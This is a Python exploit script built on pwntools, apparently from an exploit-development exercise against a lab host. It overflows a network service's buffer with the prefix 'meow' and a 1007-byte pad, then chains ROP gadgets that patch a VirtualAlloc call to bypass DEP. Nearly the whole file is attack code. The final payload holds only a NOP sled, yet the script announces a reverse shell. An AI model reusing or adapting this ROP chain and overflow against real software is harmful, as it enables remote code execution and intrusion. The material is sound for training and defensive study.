#!/usr/bin/python
from pwn import *
from struct import pack


# Exploit Information
# ---------------------------

ip = "192.168.223.141"
port = 8787
offset = 1007

print("[!] Target Information")
print("[!] IP Address : " + ip)
print("[!] Port : "+ str(port))

# ---------------------------

def virtualalloc():
    va  = pack("<L", 0x40404040) # VritualAlloc Call Address
    va += pack("<L", 0x41414141) # Return to Shellcode
    va += pack("<L", 0x42424242) # LPVOID lpAddress
    va += pack("<L", 0x43434343) # SIZE_T dwSize
    va += pack("<L", 0x44444444) # DWORD  flAllocationType
    va += pack("<L", 0x45454545) # DWORD  flProtect
    return va

def build_rop():

    # Get stack pointer value
    rop  = pack("<L", 0x01121460) # push esp ; pop ebp ; ret
    rop += pack("<L", 0x0112146b) # push ebp ; pop esi ; ret
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret

    # Subtract stack pointer to the VirtualAlloc call address for later patch
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffe4) # -0x1c
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret

    # Get VirtualAlloc call address
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0x011291dc) # VirtualAlloc in IAT address
    rop += pack("<L", 0x01121476) # mov ecx, [eax] ; ret

    # Patch VirtualAlloc call address
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121465) # xchg esi, ecx ; ret
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Inc pointer to patch shellcode address
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Add pointer to shellcode address
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xfffffeb4) # -0x14c
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret

    # Patch return to shellcode address
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to lpbuffer
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch lpbuffer
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to dwSize
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch dwSize
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffff) # -0x1
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to flAllocationType
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch flAllocationType
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffefff) # -0x1001
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Add pointer to flProtect
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret
    rop += pack("<L", 0x01121463) # inc eax ; ret

    # Patch flProtect
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffc0) # -0x40
    rop += pack("<L", 0x01121468) # neg eax ; ret
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121473) # mov [eax], ecx ; ret

    # Back to VirtualAlloc call address and bypass DEP
    rop += pack("<L", 0x0112147c) # xchg eax, ecx ; nop ; pop ebp ; ret
    rop += pack("<L", 0x87878787) # Junk for ebp
    rop += pack("<L", 0x01121471) # pop eax ; ret
    rop += pack("<L", 0xffffffec) # -0x14
    rop += pack("<L", 0x0112146e) # add eax, ecx ; ret
    rop += pack("<L", 0x01122e8d) # xchg eax, esp ; ret

    return rop

def build_payload():
    va = virtualalloc()
    pattern = b'A' * (offset - len(va))
    rop = build_rop()

    payload  = b'meow '
    payload += pattern
    payload += va
    payload += rop
    payload += b'\x90' * 40
    return payload

def main():
    r = remote(ip, port)
    r.recvuntil(b']')
    payload = build_payload()
    print("[+] Payload Length : " + str(len(payload)))

    r.sendline(payload)
    print("[+] Send Payload !")
    print("[+] Target crashed, reverse shell should be back ;)")

main()
